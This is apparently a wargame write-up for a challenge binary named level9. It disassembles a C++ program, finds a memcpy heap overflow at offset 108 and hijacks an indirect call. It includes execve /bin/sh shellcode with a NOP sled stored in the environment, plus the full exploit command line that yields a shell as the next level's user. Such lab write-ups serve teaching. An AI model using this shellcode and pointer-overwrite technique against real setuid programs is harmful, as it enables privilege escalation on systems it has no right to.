# Level9

First step - testing the program

	$ ./level9
	$ ./level9 coucou
	$ ./level9 coucou coucou

Nothing

Start in GDB

	(gdb-peda)$ pdisas main
	Dump of assembler code for function main:
	   0x080485f4 <+0>:		push   ebp
	   0x080485f5 <+1>:		mov    ebp,esp
	   0x080485f7 <+3>:		push   ebx
	   0x080485f8 <+4>:		and    esp,0xfffffff0
	   0x080485fb <+7>:		sub    esp,0x20
	   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
	   0x08048602 <+14>:	jg     0x8048610 <main+28>
	   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
	   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
	   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
	   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
	   0x0804861c <+40>:	mov    ebx,eax
	   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
	   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
	   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
	   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
	   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
	   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
	   0x0804863e <+74>:	mov    ebx,eax
	   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
	   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
	   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
	   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
	   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
	   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
	   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
	   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
	   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
	   0x08048667 <+115>:	add    eax,0x4
	   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
	   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
	   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
	   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
	   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
	   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
	   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
	   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
	   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
	   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
	   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
	   0x08048693 <+159>:	call   edx
	   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
	   0x08048698 <+164>:	leave
	   0x08048699 <+165>:	ret
	End of assembler dump.

It seems to be C++, try to understand the first call "_Znwj" with c++filt to be sure

	$ c++filt _Znwj                                                                     !
	operator new(unsigned int)

It's the builtin new

The program dereference EAX 2 times at main+136 and there is a call on EDX at main+159

Get all the functions

	(gdb) info function
	All defined functions:

	Non-debugging symbols:
	...
	0x08048510  memcpy
	0x08048510  memcpy@plt
	...

There is a memcpy call, we can overflow

Search the offset of the overflow with my scripts

	(gdb) r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
	Starting program: /home/user/level9/level9 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz%'

	Program received signal SIGSEGV, Segmentation fault.
	0x08048682 in main ()

	(gdb) i r
	eax            0x62626262	1650614882
	ecx            0x7a7a7a7a	2054847098
	edx            0x804a0dc	134521052
	ebx            0x804a078	134520952
	esp            0xbffff350	0xbffff350
	ebp            0xbffff378	0xbffff378
	esi            0x0	0
	edi            0x0	0
	eip            0x8048682	0x8048682 <main+142>
	eflags         0x210287	[ CF PF SF IF RF ID ]
	cs             0x73	115
	ss             0x7b	123
	ds             0x7b	123
	es             0x7b	123
	fs             0x0	0
	gs             0x33	51


	./get_offset.py 62626262
	bbbb => offset = 108

We can see the pattern in EAX at the offset 108

We will use this shellcode : 
	
	\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

We will store the payload in the environnement

Let's see which address EAX dereference for store the address of the nopsled in the env

	   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
	   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
	   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
	   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]

Put a breakpoint at main+136, run with my pattern and seewhat's happening step by step

	(gdb) x/x $eax
	0x804a00c:	0x41414141
	(gdb) si
	0x08048680 in main ()
	(gdb) x/x $eax
	0x804a078:	0x62626262
	(gdb) si
	0x08048682 in main ()
	(gdb) x/x $eax
	0x62626262:	Cannot access memory at address 0x62626262

First we have AAAA (41414141) at the address `0x804a00c` offset 0, then bbbb (62626262) at the offset 108 and finally the error

We can understand what we need to do. Write the address of the nopesled at the offset 0 instead of AAAA. And the address of this memory case (0x804a00c) on the offset 108 for be called by EDX

Now, find the address of our payload (without export for not modify the real env)

	$ env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level9 

	(gdb) b main
	Breakpoint 1 at 0x80485f8

	(gdb) r
	Starting program: /home/user/level9/level9 

	Breakpoint 1, 0x080485f8 in main ()
	(gdb) x/200s environ
	....

Choose an address in the nopesled, for example : `0xbffffc63`

Build the exploit!

	python -c 'print "\x63\xfc\xff\xbf"+"B"*104+"\x0c\xa0\x04\x08"'

The final command will be :

	$ env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf"+"B"*104+"\x0c\xa0\x04\x08"')
	$ whoami
	bonus0





